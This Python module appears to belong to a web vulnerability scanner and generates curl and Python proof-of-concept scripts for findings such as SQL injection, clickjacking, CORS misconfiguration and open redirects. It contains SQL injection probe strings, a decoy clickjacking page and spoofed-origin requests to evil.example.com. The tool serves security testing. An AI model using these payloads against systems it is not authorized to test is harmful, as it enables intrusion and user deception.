"""
PoC generator skill — produces curl + Python proof-of-concept scripts
for every verified finding.

Output: context.poc_scripts (list of PocScript objects)
        also written to output/pocs/ directory
"""
from __future__ import annotations

import logging
import textwrap
from dataclasses import dataclass
from pathlib import Path

from core.context import Context
from core.models import Finding, FindingCategory

logger = logging.getLogger(__name__)

POC_DIR = Path("output/pocs")


@dataclass
class PocScript:
    finding_title:  str
    target:         str
    curl_cmd:       str
    python_script:  str
    notes:          str
    filename_stem:  str


# ── per-category PoC templates ────────────────────────────────────────────────

def _poc_sqli_error(f: Finding) -> PocScript:
    url = f.target
    curl = f"curl -s '{url}' --data-urlencode \"id=1'\" | grep -i 'sql\\|mysql\\|syntax'"
    py = textwrap.dedent(f"""\
        import requests

        url = "{url}"
        # Error-based SQLi PoC — confirms DB error is returned
        payload = {{"id": "1'"}}
        r = requests.get(url, params=payload, timeout=10)
        print(f"Status: {{r.status_code}}")
        for line in r.text.splitlines():
            if any(kw in line.lower() for kw in ["sql", "mysql", "syntax", "ora-", "pg_"]):
                print(f"DB error: {{line}}")
    """)
    return PocScript(
        finding_title=f.title, target=url,
        curl_cmd=curl, python_script=py,
        notes="Safe — read-only error probe. No data is extracted.",
        filename_stem="sqli_error",
    )


def _poc_sqli_boolean(f: Finding) -> PocScript:
    url = f.target
    curl = (
        f"# TRUE condition:\ncurl -s '{url}?id=1%27+OR+%271%27%3D%271' | wc -c\n"
        f"# FALSE condition:\ncurl -s '{url}?id=1%27+OR+%271%27%3D%272' | wc -c\n"
        "# Significant byte difference = boolean SQLi confirmed"
    )
    py = textwrap.dedent(f"""\
        import requests

        url = "{url}"
        # Boolean-based SQLi PoC — measures response length divergence only
        params_true  = {{"id": "1' OR '1'='1"}}
        params_false = {{"id": "1' OR '1'='2"}}
        r_true  = requests.get(url, params=params_true,  timeout=10)
        r_false = requests.get(url, params=params_false, timeout=10)
        diff = abs(len(r_true.text) - len(r_false.text))
        print(f"TRUE  response: {{len(r_true.text)}} bytes")
        print(f"FALSE response: {{len(r_false.text)}} bytes")
        print(f"Divergence:     {{diff}} bytes")
        print("CONFIRMED" if diff > 200 else "NOT CONFIRMED")
    """)
    return PocScript(
        finding_title=f.title, target=url,
        curl_cmd=curl, python_script=py,
        notes="Safe — measures response length only. No data extracted.",
        filename_stem="sqli_boolean",
    )


def _poc_clickjacking(f: Finding) -> PocScript:
    url = f.target
    html_poc = textwrap.dedent(f"""\
        <!DOCTYPE html>
        <!-- Clickjacking PoC — save as poc.html and open in browser -->
        <html>
        <head><style>
          iframe {{
            width: 800px; height: 600px;
            opacity: 0.5;   /* set to 0.01 for invisible overlay */
            position: absolute; top: 0; left: 0; z-index: 2;
            border: none;
          }}
          .decoy {{
            position: absolute; top: 150px; left: 300px;
            z-index: 1; font-size: 20px; background: #fff; padding: 10px;
          }}
        </style></head>
        <body>
          <div class="decoy">Click here to win a prize!</div>
          <iframe src="{url}"></iframe>
        </body>
        </html>
    """)
    curl = (
        f"curl -I '{url}' | grep -i 'x-frame-options\\|content-security-policy'\n"
        "# If empty — page can be embedded in an iframe"
    )
    py = textwrap.dedent(f"""\
        import requests

        url = "{url}"
        r = requests.get(url, timeout=10)
        xfo = r.headers.get("X-Frame-Options", "(absent)")
        csp = r.headers.get("Content-Security-Policy", "(absent)")
        print(f"X-Frame-Options:         {{xfo}}")
        print(f"Content-Security-Policy: {{csp}}")
        if xfo == "(absent)" and "frame-ancestors" not in csp:
            print("VULNERABLE — page can be framed")
        else:
            print("PROTECTED")

        # Save HTML PoC file
        with open("clickjacking_poc.html", "w") as fh:
            fh.write(\"\"\"<!DOCTYPE html>
<html><body>
<iframe src="{url}" style="opacity:0.5;width:800px;height:600px;"></iframe>
</body></html>\"\"\")
        print("Saved: clickjacking_poc.html — open in browser to confirm")
    """)
    return PocScript(
        finding_title=f.title, target=url,
        curl_cmd=curl, python_script=py,
        notes=html_poc,
        filename_stem="clickjacking",
    )


def _poc_cors(f: Finding) -> PocScript:
    url = f.target
    curl = (
        f"curl -I -H 'Origin: https://evil.example.com' '{url}' "
        "| grep -i 'access-control'"
    )
    py = textwrap.dedent(f"""\
        import requests

        url = "{url}"
        r = requests.get(url, headers={{"Origin": "https://evil.example.com"}}, timeout=10)
        acao = r.headers.get("Access-Control-Allow-Origin", "(absent)")
        acac = r.headers.get("Access-Control-Allow-Credentials", "(absent)")
        print(f"Access-Control-Allow-Origin:      {{acao}}")
        print(f"Access-Control-Allow-Credentials: {{acac}}")
        if acao == "*":
            print("VULNERABLE — wildcard CORS")
        elif acac.lower() == "true" and acao not in ("*", "(absent)"):
            print(f"VULNERABLE — credentialed CORS allowed for {{acao}}")
    """)
    return PocScript(
        finding_title=f.title, target=url,
        curl_cmd=curl, python_script=py,
        notes="Safe — read-only header check with spoofed Origin.",
        filename_stem="cors_wildcard",
    )


def _poc_open_redirect(f: Finding) -> PocScript:
    url = f.target
    payload_url = f"{url}?url=https://evil.example.com"
    curl = (
        f"curl -I '{payload_url}' | grep -i 'location'\n"
        "# If Location: https://evil.example.com → confirmed open redirect"
    )
    py = textwrap.dedent(f"""\
        import requests

        test_url = "{payload_url}"
        r = requests.get(test_url, allow_redirects=False, timeout=10)
        location = r.headers.get("Location", "")
        print(f"Status:   {{r.status_code}}")
        print(f"Location: {{location}}")
        if r.status_code in (301,302,303,307,308) and "evil.example.com" in location:
            print("CONFIRMED open redirect")
    """)
    return PocScript(
        finding_title=f.title, target=url,
        curl_cmd=curl, python_script=py,
        notes="Safe — read-only redirect check.",
        filename_stem="open_redirect",
    )


def _poc_missing_header(f: Finding) -> PocScript:
    url  = f.target
    hdr  = f.title.split("Missing ")[-1].split(" —")[0].strip()
    curl = f"curl -I '{url}' | grep -i '{hdr.lower()}'"
    py = textwrap.dedent(f"""\
        import requests

        url = "{url}"
        header = "{hdr}"
        r = requests.get(url, timeout=10)
        value = r.headers.get(header, "(absent)")
        print(f"{{header}}: {{value}}")
        print("MISSING" if value == "(absent)" else "PRESENT")
    """)
    return PocScript(
        finding_title=f.title, target=url,
        curl_cmd=curl, python_script=py,
        notes="Safe — read-only header check.",
        filename_stem=f"missing_header_{hdr.lower().replace('-','_').replace(' ','_')[:30]}",
    )


def _poc_sensitive_file(f: Finding) -> PocScript:
    url = f.target
    curl = f"curl -s -o /dev/null -w '%{{http_code}}' '{url}'"
    py = textwrap.dedent(f"""\
        import requests

        url = "{url}"
        r = requests.get(url, timeout=10)
        print(f"Status: {{r.status_code}}, Size: {{len(r.content)}} bytes")
        if r.status_code == 200 and len(r.content) > 50:
            print("ACCESSIBLE — review content manually")
    """)
    return PocScript(
        finding_title=f.title, target=url,
        curl_cmd=curl, python_script=py,
        notes="Safe — read-only HTTP GET.",
        filename_stem="sensitive_file",
    )


def _poc_generic(f: Finding) -> PocScript:
    url = f.target
    curl = f"curl -sv '{url}' 2>&1 | head -50"
    py = textwrap.dedent(f"""\
        import requests

        url = "{url}"
        r = requests.get(url, timeout=10)
        print(f"Status:  {{r.status_code}}")
        print(f"Headers: {{dict(r.headers)}}")
        print(f"Body snippet: {{r.text[:200]}}")
    """)
    return PocScript(
        finding_title=f.title, target=url,
        curl_cmd=curl, python_script=py,
        notes="Generic HTTP probe.",
        filename_stem="generic",
    )


# ── dispatcher ────────────────────────────────────────────────────────────────

def _build_poc(f: Finding) -> PocScript | None:
    title = f.title.lower()
    if "sql injection" in title and "error" in title:   return _poc_sqli_error(f)
    if "sql injection" in title and "boolean" in title: return _poc_sqli_boolean(f)
    if "clickjacking" in title:                         return _poc_clickjacking(f)
    if "cors" in title or "wildcard" in title:          return _poc_cors(f)
    if "open redirect" in title:                        return _poc_open_redirect(f)
    if "missing" in title and "header" in title:        return _poc_missing_header(f)
    if any(kw in title for kw in ["sensitive", "exposed", "accessible", ".env", "backup"]):
        return _poc_sensitive_file(f)
    if f.category == FindingCategory.INFO:
        return None  # not useful to generate PoC for pure info findings
    return _poc_generic(f)


def _safe_stem(title: str) -> str:
    import re
    return re.sub(r"[^\w]", "_", title.lower())[:50]


def run(context: Context) -> Context:
    logger.info("Generating PoC scripts")
    POC_DIR.mkdir(parents=True, exist_ok=True)

    findings = context.all_findings()
    pocs: list[PocScript] = []
    written = 0

    for i, f in enumerate(findings, 1):
        poc = _build_poc(f)
        if not poc:
            continue

        # Unique filename
        stem = f"{i:02d}_{poc.filename_stem}"
        curl_path   = POC_DIR / f"{stem}.sh"
        python_path = POC_DIR / f"{stem}.py"

        curl_path.write_text(
            f"#!/bin/bash\n# PoC: {f.title}\n# Target: {f.target}\n\n{poc.curl_cmd}\n",
            encoding="utf-8"
        )
        python_path.write_text(
            f"# PoC: {f.title}\n# Target: {f.target}\n# Notes: {poc.notes}\n\n{poc.python_script}",
            encoding="utf-8"
        )

        pocs.append(poc)
        written += 1

    # Attach to context for the report exporter
    context.poc_scripts = pocs   # type: ignore[attr-defined]

    logger.info(f"PoC generator: wrote {written} scripts to {POC_DIR}/")
    context.insights.append({
        "type":  "poc_generator",
        "count": written,
        "dir":   str(POC_DIR),
    })
    return context


skill = {"name": "poc_generator", "run": run}
